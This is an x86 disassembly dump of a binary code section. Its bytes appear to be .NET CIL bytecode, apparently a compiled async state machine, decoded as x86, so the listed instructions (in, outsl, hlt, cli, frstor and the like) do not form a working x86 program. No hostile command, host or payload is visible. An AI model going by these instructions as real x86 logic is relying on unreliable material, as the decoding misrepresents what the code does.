  4041a0:	28 ea                	sub    %ch,%dl
  4041a2:	00 00                	add    %al,(%eax)
  4041a4:	0a 7d 52             	or     0x52(%ebp),%bh
  4041a7:	00 00                	add    %al,(%eax)
  4041a9:	04 02                	add    $0x2,%al
  4041ab:	02 7b 52             	add    0x52(%ebx),%bh
  4041ae:	00 00                	add    %al,(%eax)
  4041b0:	04 7d                	add    $0x7d,%al
  4041b2:	51                   	push   %ecx
  4041b3:	00 00                	add    %al,(%eax)
  4041b5:	04 02                	add    $0x2,%al
  4041b7:	14 7d                	adc    $0x7d,%al
  4041b9:	52                   	push   %edx
  4041ba:	00 00                	add    %al,(%eax)
  4041bc:	04 02                	add    $0x2,%al
  4041be:	7b 51                	jnp    0x404211
  4041c0:	00 00                	add    %al,(%eax)
  4041c2:	04 8e                	add    $0x8e,%al
  4041c4:	16                   	push   %ss
  4041c5:	fe 03                	incb   (%ebx)
  4041c7:	13 08                	adc    (%eax),%ecx
  4041c9:	11 08                	adc    %ecx,(%eax)
  4041cb:	39 8a 08 00 00 00    	cmp    %ecx,0x8(%edx)
  4041d1:	02 7b 4f             	add    0x4f(%ebx),%bh
  4041d4:	00 00                	add    %al,(%eax)
  4041d6:	04 7b                	add    $0x7b,%al
  4041d8:	13 00                	adc    (%eax),%eax
  4041da:	00 04 17             	add    %al,(%edi,%edx,1)
  4041dd:	fe 01                	incb   (%ecx)
  4041df:	13 09                	adc    (%ecx),%ecx
  4041e1:	11 09                	adc    %ecx,(%ecx)
  4041e3:	39 82 05 00 00 00    	cmp    %eax,0x5(%edx)
  4041e9:	02 02                	add    (%edx),%al
  4041eb:	7b 51                	jnp    0x40423e
  4041ed:	00 00                	add    %al,(%eax)
  4041ef:	04 73                	add    $0x73,%al
  4041f1:	eb 00                	jmp    0x4041f3
  4041f3:	00 0a                	add    %cl,(%edx)
  4041f5:	7d 53                	jge    0x40424a
  4041f7:	00 00                	add    %al,(%eax)
  4041f9:	04 00                	add    $0x0,%al
  4041fb:	06                   	push   %es
  4041fc:	18 59 45             	sbb    %bl,0x45(%ecx)
  4041ff:	06                   	push   %es
  404200:	00 00                	add    %al,(%eax)
  404202:	00 02                	add    %al,(%edx)
  404204:	00 00                	add    %al,(%eax)
  404206:	00 07                	add    %al,(%edi)
  404208:	00 00                	add    %al,(%eax)
  40420a:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40420d:	00 00                	add    %al,(%eax)
  40420f:	11 00                	adc    %eax,(%eax)
  404211:	00 00                	add    %al,(%eax)
  404213:	16                   	push   %ss
  404214:	00 00                	add    %al,(%eax)
  404216:	00 1b                	add    %bl,(%ebx)
  404218:	00 00                	add    %al,(%eax)
  40421a:	00 2b                	add    %ch,(%ebx)
  40421c:	1e                   	push   %ds
  40421d:	38 6f 02             	cmp    %ch,0x2(%edi)
  404220:	00 00                	add    %al,(%eax)
  404222:	38 e1                	cmp    %ah,%cl
  404224:	02 00                	add    (%eax),%al
  404226:	00 38                	add    %bh,(%eax)
  404228:	53                   	push   %ebx
  404229:	03 00                	add    (%eax),%eax
  40422b:	00 38                	add    %bh,(%eax)
  40422d:	c5 03                	lds    (%ebx),%eax
  40422f:	00 00                	add    %al,(%eax)
  404231:	38 37                	cmp    %dh,(%edi)
  404233:	04 00                	add    $0x0,%al
  404235:	00 38                	add    %bh,(%eax)
  404237:	aa                   	stos   %al,%es:(%edi)
  404238:	04 00                	add    $0x0,%al
  40423a:	00 00                	add    %al,(%eax)
  40423c:	02 02                	add    (%edx),%al
  40423e:	7b 53                	jnp    0x404293
  404240:	00 00                	add    %al,(%eax)
  404242:	04 28                	add    $0x28,%al
  404244:	ec                   	in     (%dx),%al
  404245:	00 00                	add    %al,(%eax)
  404247:	0a 7d 54             	or     0x54(%ebp),%bh
  40424a:	00 00                	add    %al,(%eax)
  40424c:	04 02                	add    $0x2,%al
  40424e:	02 7b 54             	add    0x54(%ebx),%bh
  404251:	00 00                	add    %al,(%eax)
  404253:	04 6f                	add    $0x6f,%al
  404255:	ed                   	in     (%dx),%eax
  404256:	00 00                	add    %al,(%eax)
  404258:	0a 7e 37             	or     0x37(%esi),%bh
  40425b:	00 00                	add    %al,(%eax)
  40425d:	04 25                	add    $0x25,%al
  40425f:	2d 17 26 7e 36       	sub    $0x367e2617,%eax
  404264:	00 00                	add    %al,(%eax)
  404266:	04 fe                	add    $0xfe,%al
  404268:	06                   	push   %es
  404269:	31 00                	xor    %eax,(%eax)
  40426b:	00 06                	add    %al,(%esi)
  40426d:	73 ee                	jae    0x40425d
  40426f:	00 00                	add    %al,(%eax)
  404271:	0a 25 80 37 00 00    	or     0x3780,%ah
  404277:	04 28                	add    $0x28,%al
  404279:	12 00                	adc    (%eax),%al
  40427b:	00 2b                	add    %ch,(%ebx)
  40427d:	7d 55                	jge    0x4042d4
  40427f:	00 00                	add    %al,(%eax)
  404281:	04 02                	add    $0x2,%al
  404283:	7b 55                	jnp    0x4042da
  404285:	00 00                	add    %al,(%eax)
  404287:	04 28                	add    $0x28,%al
  404289:	13 00                	adc    (%eax),%eax
  40428b:	00 2b                	add    %ch,(%ebx)
  40428d:	16                   	push   %ss
  40428e:	31 1e                	xor    %ebx,(%esi)
  404290:	02 7b 4e             	add    0x4e(%ebx),%bh
  404293:	00 00                	add    %al,(%eax)
  404295:	04 6f                	add    $0x6f,%al
  404297:	cd 00                	int    $0x0
  404299:	00 0a                	add    %cl,(%edx)
  40429b:	6f                   	outsl  %ds:(%esi),(%dx)
  40429c:	f0 00 00             	lock add %al,(%eax)
  40429f:	0a 6f f1             	or     -0xf(%edi),%ch
  4042a2:	00 00                	add    %al,(%eax)
  4042a4:	0a 20                	or     (%eax),%ah
  4042a6:	c8 00 00 00          	enter  $0x0,$0x0
  4042aa:	fe 01                	incb   (%ecx)
  4042ac:	2b 01                	sub    (%ecx),%eax
  4042ae:	16                   	push   %ss
  4042af:	13 0a                	adc    (%edx),%ecx
  4042b1:	11 0a                	adc    %ecx,(%edx)
  4042b3:	39 6f 04             	cmp    %ebp,0x4(%edi)
  4042b6:	00 00                	add    %al,(%eax)
  4042b8:	00 02                	add    %al,(%edx)
  4042ba:	02 7b 55             	add    0x55(%ebx),%bh
  4042bd:	00 00                	add    %al,(%eax)
  4042bf:	04 28                	add    $0x28,%al
  4042c1:	14 00                	adc    $0x0,%al
  4042c3:	00 2b                	add    %ch,(%ebx)
  4042c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4042c6:	f3 00 00             	repz add %al,(%eax)
  4042c9:	0a 7d 56             	or     0x56(%ebp),%bh
  4042cc:	00 00                	add    %al,(%eax)
  4042ce:	04 02                	add    $0x2,%al
  4042d0:	7e 03                	jle    0x4042d5
  4042d2:	00 00                	add    %al,(%eax)
  4042d4:	04 6f                	add    $0x6f,%al
  4042d6:	f4                   	hlt
  4042d7:	00 00                	add    %al,(%eax)
  4042d9:	0a 7d 57             	or     0x57(%ebp),%bh
  4042dc:	00 00                	add    %al,(%eax)
  4042de:	04 02                	add    $0x2,%al
  4042e0:	02 7b 57             	add    0x57(%ebx),%bh
  4042e3:	00 00                	add    %al,(%eax)
  4042e5:	04 1d                	add    $0x1d,%al
  4042e7:	8d 10                	lea    (%eax),%edx
  4042e9:	00 00                	add    %al,(%eax)
  4042eb:	01 25 16 02 7b 4f    	add    %esp,0x4f7b0216
  4042f1:	00 00                	add    %al,(%eax)
  4042f3:	04 7b                	add    $0x7b,%al
  4042f5:	18 00                	sbb    %al,(%eax)
  4042f7:	00 04 8c             	add    %al,(%esp,%ecx,4)
  4042fa:	58                   	pop    %eax
  4042fb:	00 00                	add    %al,(%eax)
  4042fd:	01 a2 25 17 02 7b    	add    %esp,0x7b021725(%edx)
  404303:	4f                   	dec    %edi
  404304:	00 00                	add    %al,(%eax)
  404306:	04 7b                	add    $0x7b,%al
  404308:	1a 00                	sbb    (%eax),%al
  40430a:	00 04 8c             	add    %al,(%esp,%ecx,4)
  40430d:	58                   	pop    %eax
  40430e:	00 00                	add    %al,(%eax)
  404310:	01 a2 25 18 02 7b    	add    %esp,0x7b021825(%edx)
  404316:	4f                   	dec    %edi
  404317:	00 00                	add    %al,(%eax)
  404319:	04 7b                	add    $0x7b,%al
  40431b:	1c 00                	sbb    $0x0,%al
  40431d:	00 04 a2             	add    %al,(%edx,%eiz,4)
  404320:	25 19 02 7b 4f       	and    $0x4f7b0219,%eax
  404325:	00 00                	add    %al,(%eax)
  404327:	04 7b                	add    $0x7b,%al
  404329:	1d 00 00 04 a2       	sbb    $0xa2040000,%eax
  40432e:	25 1a 02 7b 4f       	and    $0x4f7b021a,%eax
  404333:	00 00                	add    %al,(%eax)
  404335:	04 7b                	add    $0x7b,%al
  404337:	19 00                	sbb    %eax,(%eax)
  404339:	00 04 8c             	add    %al,(%esp,%ecx,4)
  40433c:	58                   	pop    %eax
  40433d:	00 00                	add    %al,(%eax)
  40433f:	01 a2 25 1b 02 7b    	add    %esp,0x7b021b25(%edx)
  404345:	4f                   	dec    %edi
  404346:	00 00                	add    %al,(%eax)
  404348:	04 7b                	add    $0x7b,%al
  40434a:	1b 00                	sbb    (%eax),%eax
  40434c:	00 04 8c             	add    %al,(%esp,%ecx,4)
  40434f:	58                   	pop    %eax
  404350:	00 00                	add    %al,(%eax)
  404352:	01 a2 25 1c 02 7b    	add    %esp,0x7b021c25(%edx)
  404358:	4f                   	dec    %edi
  404359:	00 00                	add    %al,(%eax)
  40435b:	04 7b                	add    $0x7b,%al
  40435d:	1d 00 00 04 a2       	sbb    $0xa2040000,%eax
  404362:	28 2f                	sub    %ch,(%edi)
  404364:	00 00                	add    %al,(%eax)
  404366:	0a 7d 57             	or     0x57(%ebp),%bh
  404369:	00 00                	add    %al,(%eax)
  40436b:	04 02                	add    $0x2,%al
  40436d:	7b 54                	jnp    0x4043c3
  40436f:	00 00                	add    %al,(%eax)
  404371:	04 02                	add    $0x2,%al
  404373:	7b 56                	jnp    0x4043cb
  404375:	00 00                	add    %al,(%eax)
  404377:	04 72                	add    $0x72,%al
  404379:	bd 40 00 70 28       	mov    $0x28700040,%ebp
  40437e:	f5                   	cmc
  40437f:	00 00                	add    %al,(%eax)
  404381:	0a 6f f6             	or     -0xa(%edi),%ch
  404384:	00 00                	add    %al,(%eax)
  404386:	0a 28                	or     (%eax),%ch
  404388:	15 00 00 2b 00       	adc    $0x2b0000,%eax
  40438d:	02 7b 54             	add    0x54(%ebx),%bh
  404390:	00 00                	add    %al,(%eax)
  404392:	04 02                	add    $0x2,%al
  404394:	7b 56                	jnp    0x4043ec
  404396:	00 00                	add    %al,(%eax)
  404398:	04 72                	add    $0x72,%al
  40439a:	d3 40 00             	roll   %cl,0x0(%eax)
  40439d:	70 28                	jo     0x4043c7
  40439f:	f5                   	cmc
  4043a0:	00 00                	add    %al,(%eax)
  4043a2:	0a 6f f6             	or     -0xa(%edi),%ch
  4043a5:	00 00                	add    %al,(%eax)
  4043a7:	0a 28                	or     (%eax),%ch
  4043a9:	15 00 00 2b 00       	adc    $0x2b0000,%eax
  4043ae:	02 7b 54             	add    0x54(%ebx),%bh
  4043b1:	00 00                	add    %al,(%eax)
  4043b3:	04 02                	add    $0x2,%al
  4043b5:	7b 56                	jnp    0x40440d
  4043b7:	00 00                	add    %al,(%eax)
  4043b9:	04 72                	add    $0x72,%al
  4043bb:	f1                   	int1
  4043bc:	40                   	inc    %eax
  4043bd:	00 70 28             	add    %dh,0x28(%eax)
  4043c0:	f5                   	cmc
  4043c1:	00 00                	add    %al,(%eax)
  4043c3:	0a 6f f6             	or     -0xa(%edi),%ch
  4043c6:	00 00                	add    %al,(%eax)
  4043c8:	0a 28                	or     (%eax),%ch
  4043ca:	15 00 00 2b 00       	adc    $0x2b0000,%eax
  4043cf:	02 02                	add    (%edx),%al
  4043d1:	7b 57                	jnp    0x40442a
  4043d3:	00 00                	add    %al,(%eax)
  4043d5:	04 28                	add    $0x28,%al
  4043d7:	f8                   	clc
  4043d8:	00 00                	add    %al,(%eax)
  4043da:	0a 7d 58             	or     0x58(%ebp),%bh
  4043dd:	00 00                	add    %al,(%eax)
  4043df:	04 02                	add    $0x2,%al
  4043e1:	7b 54                	jnp    0x404437
  4043e3:	00 00                	add    %al,(%eax)
  4043e5:	04 02                	add    $0x2,%al
  4043e7:	7b 56                	jnp    0x40443f
  4043e9:	00 00                	add    %al,(%eax)
  4043eb:	04 72                	add    $0x72,%al
  4043ed:	ad                   	lods   %ds:(%esi),%eax
  4043ee:	3d 00 70 28 f5       	cmp    $0xf5287000,%eax
  4043f3:	00 00                	add    %al,(%eax)
  4043f5:	0a 6f f6             	or     -0xa(%edi),%ch
  4043f8:	00 00                	add    %al,(%eax)
  4043fa:	0a 28                	or     (%eax),%ch
  4043fc:	16                   	push   %ss
  4043fd:	00 00                	add    %al,(%eax)
  4043ff:	2b 02                	sub    (%edx),%eax
  404401:	7b 58                	jnp    0x40445b
  404403:	00 00                	add    %al,(%eax)
  404405:	04 6f                	add    $0x6f,%al
  404407:	f9                   	stc
  404408:	00 00                	add    %al,(%eax)
  40440a:	0a 00                	or     (%eax),%al
  40440c:	02 02                	add    (%edx),%al
  40440e:	7b 54                	jnp    0x404464
  404410:	00 00                	add    %al,(%eax)
  404412:	04 17                	add    $0x17,%al
  404414:	6f                   	outsl  %ds:(%esi),(%dx)
  404415:	fa                   	cli
  404416:	00 00                	add    %al,(%eax)
  404418:	0a 72 1d             	or     0x1d(%edx),%dh
  40441b:	41                   	inc    %ecx
  40441c:	00 70 72             	add    %dh,0x72(%eax)
  40441f:	49                   	dec    %ecx
  404420:	41                   	inc    %ecx
  404421:	00 70 6f             	add    %dh,0x6f(%eax)
  404424:	fb                   	sti
  404425:	00 00                	add    %al,(%eax)
  404427:	0a 7d 59             	or     0x59(%ebp),%bh
  40442a:	00 00                	add    %al,(%eax)
  40442c:	04 02                	add    $0x2,%al
  40442e:	7b 4e                	jnp    0x40447e
  404430:	00 00                	add    %al,(%eax)
  404432:	04 02                	add    $0x2,%al
  404434:	7b 59                	jnp    0x40448f
  404436:	00 00                	add    %al,(%eax)
  404438:	04 6f                	add    $0x6f,%al
  40443a:	fc                   	cld
  40443b:	00 00                	add    %al,(%eax)
  40443d:	0a 00                	or     (%eax),%al
  40443f:	02 7b 4f             	add    0x4f(%ebx),%bh
  404442:	00 00                	add    %al,(%eax)
  404444:	04 72                	add    $0x72,%al
  404446:	63 41 00             	arpl   %eax,0x0(%ecx)
  404449:	70 12                	jo     0x40445d
  40444b:	03 fe                	add    %esi,%edi
  40444d:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  404452:	09 28                	or     %ebp,(%eax)
  404454:	1e                   	push   %ds
  404455:	00 00                	add    %al,(%eax)
  404457:	06                   	push   %es
  404458:	6f                   	outsl  %ds:(%esi),(%dx)
  404459:	c1 00 00             	roll   $0x0,(%eax)
  40445c:	0a 13                	or     (%ebx),%dl
  40445e:	0b 12                	or     (%edx),%edx
  404460:	0b 28                	or     (%eax),%ebp
  404462:	c2 00 00             	ret    $0x0
  404465:	0a 2d 46 02 18 25    	or     0x25180246,%ch
  40446b:	0a 7d 4b             	or     0x4b(%ebp),%bh
  40446e:	00 00                	add    %al,(%eax)
  404470:	04 02                	add    $0x2,%al
  404472:	11 0b                	adc    %ecx,(%ebx)
  404474:	7d 5d                	jge    0x4044d3
  404476:	00 00                	add    %al,(%eax)
  404478:	04 02                	add    $0x2,%al
  40447a:	13 04 02             	adc    (%edx,%eax,1),%eax
  40447d:	7c 4c                	jl     0x4044cb
  40447f:	00 00                	add    %al,(%eax)
  404481:	04 12                	add    $0x12,%al
  404483:	0b 12                	or     (%edx),%edx
  404485:	04 28                	add    $0x28,%al
  404487:	10 00                	adc    %al,(%eax)
  404489:	00 2b                	add    %ch,(%ebx)
  40448b:	00 dd                	add    %bl,%ch
  40448d:	0f 06                	clts
  40448f:	00 00                	add    %al,(%eax)
  404491:	02 7b 5d             	add    0x5d(%ebx),%bh
  404494:	00 00                	add    %al,(%eax)
  404496:	04 13                	add    $0x13,%al
  404498:	0b 02                	or     (%edx),%eax
  40449a:	7c 5d                	jl     0x4044f9
  40449c:	00 00                	add    %al,(%eax)
  40449e:	04 fe                	add    $0xfe,%al
  4044a0:	15 1c 00 00 01       	adc    $0x100001c,%eax
  4044a5:	02 15 25 0a 7d 4b    	add    0x4b7d0a25,%dl
  4044ab:	00 00                	add    %al,(%eax)
  4044ad:	04 12                	add    $0x12,%al
  4044af:	0b 28                	or     (%eax),%ebp
  4044b1:	c3                   	ret
  4044b2:	00 00                	add    %al,(%eax)
  4044b4:	0a 00                	or     (%eax),%al
  4044b6:	02 7b 4f             	add    0x4f(%ebx),%bh
  4044b9:	00 00                	add    %al,(%eax)
  4044bb:	04 72                	add    $0x72,%al
  4044bd:	db 39                	fstpt  (%ecx)
  4044bf:	00 70 12             	add    %dh,0x12(%eax)
  4044c2:	03 fe                	add    %esi,%edi
  4044c4:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  4044c9:	09 28                	or     %ebp,(%eax)
  4044cb:	1d 00 00 06 6f       	sbb    $0x6f060000,%eax
  4044d0:	c1 00 00             	roll   $0x0,(%eax)
  4044d3:	0a 13                	or     (%ebx),%dl
  4044d5:	0c 12                	or     $0x12,%al
  4044d7:	0c 28                	or     $0x28,%al
  4044d9:	c2 00 00             	ret    $0x0
  4044dc:	0a 2d 46 02 19 25    	or     0x25190246,%ch
  4044e2:	0a 7d 4b             	or     0x4b(%ebp),%bh
  4044e5:	00 00                	add    %al,(%eax)
  4044e7:	04 02                	add    $0x2,%al
  4044e9:	11 0c 7d 5d 00 00 04 	adc    %ecx,0x400005d(,%edi,2)
  4044f0:	02 13                	add    (%ebx),%dl
  4044f2:	04 02                	add    $0x2,%al
  4044f4:	7c 4c                	jl     0x404542
  4044f6:	00 00                	add    %al,(%eax)
  4044f8:	04 12                	add    $0x12,%al
  4044fa:	0c 12                	or     $0x12,%al
  4044fc:	04 28                	add    $0x28,%al
  4044fe:	10 00                	adc    %al,(%eax)
  404500:	00 2b                	add    %ch,(%ebx)
  404502:	00 dd                	add    %bl,%ch
  404504:	98                   	cwtl
  404505:	05 00 00 02 7b       	add    $0x7b020000,%eax
  40450a:	5d                   	pop    %ebp
  40450b:	00 00                	add    %al,(%eax)
  40450d:	04 13                	add    $0x13,%al
  40450f:	0c 02                	or     $0x2,%al
  404511:	7c 5d                	jl     0x404570
  404513:	00 00                	add    %al,(%eax)
  404515:	04 fe                	add    $0xfe,%al
  404517:	15 1c 00 00 01       	adc    $0x100001c,%eax
  40451c:	02 15 25 0a 7d 4b    	add    0x4b7d0a25,%dl
  404522:	00 00                	add    %al,(%eax)
  404524:	04 12                	add    $0x12,%al
  404526:	0c 28                	or     $0x28,%al
  404528:	c3                   	ret
  404529:	00 00                	add    %al,(%eax)
  40452b:	0a 00                	or     (%eax),%al
  40452d:	02 7b 4f             	add    0x4f(%ebx),%bh
  404530:	00 00                	add    %al,(%eax)
  404532:	04 72                	add    $0x72,%al
  404534:	27                   	daa
  404535:	3f                   	aas
  404536:	00 70 12             	add    %dh,0x12(%eax)
  404539:	03 fe                	add    %esi,%edi
  40453b:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  404540:	09 28                	or     %ebp,(%eax)
  404542:	1d 00 00 06 6f       	sbb    $0x6f060000,%eax
  404547:	c1 00 00             	roll   $0x0,(%eax)
  40454a:	0a 13                	or     (%ebx),%dl
  40454c:	0d 12 0d 28 c2       	or     $0xc2280d12,%eax
  404551:	00 00                	add    %al,(%eax)
  404553:	0a 2d 46 02 1a 25    	or     0x251a0246,%ch
  404559:	0a 7d 4b             	or     0x4b(%ebp),%bh
  40455c:	00 00                	add    %al,(%eax)
  40455e:	04 02                	add    $0x2,%al
  404560:	11 0d 7d 5d 00 00    	adc    %ecx,0x5d7d
  404566:	04 02                	add    $0x2,%al
  404568:	13 04 02             	adc    (%edx,%eax,1),%eax
  40456b:	7c 4c                	jl     0x4045b9
  40456d:	00 00                	add    %al,(%eax)
  40456f:	04 12                	add    $0x12,%al
  404571:	0d 12 04 28 10       	or     $0x10280412,%eax
  404576:	00 00                	add    %al,(%eax)
  404578:	2b 00                	sub    (%eax),%eax
  40457a:	dd 21                	frstor (%ecx)
  40457c:	05 00 00 02 7b       	add    $0x7b020000,%eax
  404581:	5d                   	pop    %ebp
  404582:	00 00                	add    %al,(%eax)
  404584:	04 13                	add    $0x13,%al
  404586:	0d 02 7c 5d 00       	or     $0x5d7c02,%eax
  40458b:	00 04 fe             	add    %al,(%esi,%edi,8)
  40458e:	15 1c 00 00 01       	adc    $0x100001c,%eax
  404593:	02 15 25 0a 7d 4b    	add    0x4b7d0a25,%dl
  404599:	00 00                	add    %al,(%eax)
  40459b:	04 12                	add    $0x12,%al
  40459d:	0d 28 c3 00 00       	or     $0xc328,%eax
  4045a2:	0a 00                	or     (%eax),%al
  4045a4:	02 7b 4f             	add    0x4f(%ebx),%bh
  4045a7:	00 00                	add    %al,(%eax)
  4045a9:	04 72                	add    $0x72,%al
  4045ab:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4045ac:	41                   	inc    %ecx
  4045ad:	00 70 12             	add    %dh,0x12(%eax)
  4045b0:	03 fe                	add    %esi,%edi
  4045b2:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  4045b7:	09 28                	or     %ebp,(%eax)
  4045b9:	1d 00 00 06 6f       	sbb    $0x6f060000,%eax
  4045be:	c1 00 00             	roll   $0x0,(%eax)
  4045c1:	0a 13                	or     (%ebx),%dl
  4045c3:	0e                   	push   %cs
  4045c4:	12 0e                	adc    (%esi),%cl
  4045c6:	28 c2                	sub    %al,%dl
  4045c8:	00 00                	add    %al,(%eax)
  4045ca:	0a 2d 46 02 1b 25    	or     0x251b0246,%ch
  4045d0:	0a 7d 4b             	or     0x4b(%ebp),%bh
  4045d3:	00 00                	add    %al,(%eax)
  4045d5:	04 02                	add    $0x2,%al
  4045d7:	11 0e                	adc    %ecx,(%esi)
  4045d9:	7d 5d                	jge    0x404638
  4045db:	00 00                	add    %al,(%eax)
  4045dd:	04 02                	add    $0x2,%al
  4045df:	13 04 02             	adc    (%edx,%eax,1),%eax
  4045e2:	7c 4c                	jl     0x404630
  4045e4:	00 00                	add    %al,(%eax)
  4045e6:	04 12                	add    $0x12,%al
  4045e8:	0e                   	push   %cs
  4045e9:	12 04 28             	adc    (%eax,%ebp,1),%al
  4045ec:	10 00                	adc    %al,(%eax)
  4045ee:	00 2b                	add    %ch,(%ebx)
  4045f0:	00 dd                	add    %bl,%ch
  4045f2:	aa                   	stos   %al,%es:(%edi)
  4045f3:	04 00                	add    $0x0,%al
  4045f5:	00 02                	add    %al,(%edx)
  4045f7:	7b 5d                	jnp    0x404656
  4045f9:	00 00                	add    %al,(%eax)
  4045fb:	04 13                	add    $0x13,%al
  4045fd:	0e                   	push   %cs
  4045fe:	02 7c 5d 00          	add    0x0(%ebp,%ebx,2),%bh
  404602:	00 04 fe             	add    %al,(%esi,%edi,8)
  404605:	15 1c 00 00 01       	adc    $0x100001c,%eax
  40460a:	02 15 25 0a 7d 4b    	add    0x4b7d0a25,%dl
  404610:	00 00                	add    %al,(%eax)
  404612:	04 12                	add    $0x12,%al
  404614:	0e                   	push   %cs
  404615:	28 c3                	sub    %al,%bl
  404617:	00 00                	add    %al,(%eax)
  404619:	0a 00                	or     (%eax),%al
  40461b:	02 7b 4f             	add    0x4f(%ebx),%bh
  40461e:	00 00                	add    %al,(%eax)
  404620:	04 72                	add    $0x72,%al
  404622:	27                   	daa
  404623:	3f                   	aas
  404624:	00 70 12             	add    %dh,0x12(%eax)
  404627:	03 fe                	add    %esi,%edi
  404629:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  40462e:	09 28                	or     %ebp,(%eax)
  404630:	1d 00 00 06 6f       	sbb    $0x6f060000,%eax
  404635:	c1 00 00             	roll   $0x0,(%eax)
  404638:	0a 13                	or     (%ebx),%dl
  40463a:	0f 12 0f             	movlps (%edi),%xmm1
  40463d:	28 c2                	sub    %al,%dl
  40463f:	00 00                	add    %al,(%eax)
  404641:	0a 2d 46 02 1c 25    	or     0x251c0246,%ch
  404647:	0a 7d 4b             	or     0x4b(%ebp),%bh
  40464a:	00 00                	add    %al,(%eax)
  40464c:	04 02                	add    $0x2,%al
  40464e:	11 0f                	adc    %ecx,(%edi)
  404650:	7d 5d                	jge    0x4046af
  404652:	00 00                	add    %al,(%eax)
  404654:	04 02                	add    $0x2,%al
  404656:	13 04 02             	adc    (%edx,%eax,1),%eax
  404659:	7c 4c                	jl     0x4046a7
  40465b:	00 00                	add    %al,(%eax)
  40465d:	04 12                	add    $0x12,%al
  40465f:	0f 12 04 28          	movlps (%eax,%ebp,1),%xmm0
  404663:	10 00                	adc    %al,(%eax)
  404665:	00 2b                	add    %ch,(%ebx)
  404667:	00 dd                	add    %bl,%ch
  404669:	33 04 00             	xor    (%eax,%eax,1),%eax
  40466c:	00 02                	add    %al,(%edx)
  40466e:	7b 5d                	jnp    0x4046cd
  404670:	00 00                	add    %al,(%eax)
  404672:	04 13                	add    $0x13,%al
  404674:	0f 02 7c 5d 00       	lar    0x0(%ebp,%ebx,2),%edi
  404679:	00 04 fe             	add    %al,(%esi,%edi,8)
  40467c:	15 1c 00 00 01       	adc    $0x100001c,%eax
  404681:	02 15 25 0a 7d 4b    	add    0x4b7d0a25,%dl
  404687:	00 00                	add    %al,(%eax)
  404689:	04 12                	add    $0x12,%al
  40468b:	0f 28 c3             	movaps %xmm3,%xmm0
  40468e:	00 00                	add    %al,(%eax)
  404690:	0a 00                	or     (%eax),%al
  404692:	02 7b 4f             	add    0x4f(%ebx),%bh
  404695:	00 00                	add    %al,(%eax)
  404697:	04 02                	add    $0x2,%al
  404699:	7b 59                	jnp    0x4046f4
  40469b:	00 00                	add    %al,(%eax)
  40469d:	04 12                	add    $0x12,%al
  40469f:	03 fe                	add    %esi,%edi
  4046a1:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  4046a6:	09 28                	or     %ebp,(%eax)
  4046a8:	1d 00 00 06 6f       	sbb    $0x6f060000,%eax
  4046ad:	c1 00 00             	roll   $0x0,(%eax)
  4046b0:	0a 13                	or     (%ebx),%dl
  4046b2:	10 12                	adc    %dl,(%edx)
  4046b4:	10 28                	adc    %ch,(%eax)
  4046b6:	c2 00 00             	ret    $0x0
  4046b9:	0a 2d 46 02 1d 25    	or     0x251d0246,%ch
  4046bf:	0a 7d 4b             	or     0x4b(%ebp),%bh
  4046c2:	00 00                	add    %al,(%eax)
  4046c4:	04 02                	add    $0x2,%al
  4046c6:	11 10                	adc    %edx,(%eax)
  4046c8:	7d 5d                	jge    0x404727
  4046ca:	00 00                	add    %al,(%eax)
  4046cc:	04 02                	add    $0x2,%al
  4046ce:	13 04 02             	adc    (%edx,%eax,1),%eax
  4046d1:	7c 4c                	jl     0x40471f
  4046d3:	00 00                	add    %al,(%eax)
  4046d5:	04 12                	add    $0x12,%al
  4046d7:	10 12                	adc    %dl,(%edx)
  4046d9:	04 28                	add    $0x28,%al
  4046db:	10 00                	adc    %al,(%eax)
  4046dd:	00 2b                	add    %ch,(%ebx)
  4046df:	00 dd                	add    %bl,%ch
  4046e1:	bb 03 00 00 02       	mov    $0x2000003,%ebx
  4046e6:	7b 5d                	jnp    0x404745
  4046e8:	00 00                	add    %al,(%eax)
  4046ea:	04 13                	add    $0x13,%al
  4046ec:	10 02                	adc    %al,(%edx)
  4046ee:	7c 5d                	jl     0x40474d
  4046f0:	00 00                	add    %al,(%eax)
  4046f2:	04 fe                	add    $0xfe,%al
  4046f4:	15 1c 00 00 01       	adc    $0x100001c,%eax
  4046f9:	02 15 25 0a 7d 4b    	add    0x4b7d0a25,%dl
  4046ff:	00 00                	add    %al,(%eax)
  404701:	04 12                	add    $0x12,%al
  404703:	10 28                	adc    %ch,(%eax)
  404705:	c3                   	ret
  404706:	00 00                	add    %al,(%eax)
  404708:	0a 00                	or     (%eax),%al
  40470a:	00 02                	add    %al,(%edx)
  40470c:	14 7d                	adc    $0x7d,%al
  40470e:	56                   	push   %esi
  40470f:	00 00                	add    %al,(%eax)
  404711:	04 02                	add    $0x2,%al
  404713:	14 7d                	adc    $0x7d,%al
  404715:	57                   	push   %edi
  404716:	00 00                	add    %al,(%eax)
  404718:	04 02                	add    $0x2,%al
  40471a:	14 7d                	adc    $0x7d,%al
  40471c:	58                   	pop    %eax
  40471d:	00 00                	add    %al,(%eax)
  40471f:	04 02                	add    $0x2,%al
  404721:	14 7d                	adc    $0x7d,%al
  404723:	59                   	pop    %ecx
  404724:	00 00                	add    %al,(%eax)
  404726:	04 00                	add    $0x0,%al
  404728:	02 14 7d 54 00 00 04 	add    0x4000054(,%edi,2),%dl
  40472f:	02 14 7d 55 00 00 04 	add    0x4000055(,%edi,2),%dl
  404736:	de 19                	ficomps (%ecx)
  404738:	06                   	push   %es
  404739:	16                   	push   %ss
  40473a:	2f                   	das
  40473b:	14 02                	adc    $0x2,%al
  40473d:	7b 53                	jnp    0x404792
  40473f:	00 00                	add    %al,(%eax)
  404741:	04 2c                	add    $0x2c,%al
  404743:	0c 02                	or     $0x2,%al
  404745:	7b 53                	jnp    0x40479a
  404747:	00 00                	add    %al,(%eax)
  404749:	04 6f                	add    $0x6f,%al
  40474b:	21 00                	and    %eax,(%eax)
  40474d:	00 0a                	add    %cl,(%edx)
  40474f:	00 dc                	add    %bl,%ah
  404751:	02 14 7d 53 00 00 04 	add    0x4000053(,%edi,2),%dl
  404758:	02 7b 4f             	add    0x4f(%ebx),%bh
  40475b:	00 00                	add    %al,(%eax)
  40475d:	04 16                	add    $0x16,%al
  40475f:	7d 13                	jge    0x404774
  404761:	00 00                	add    %al,(%eax)
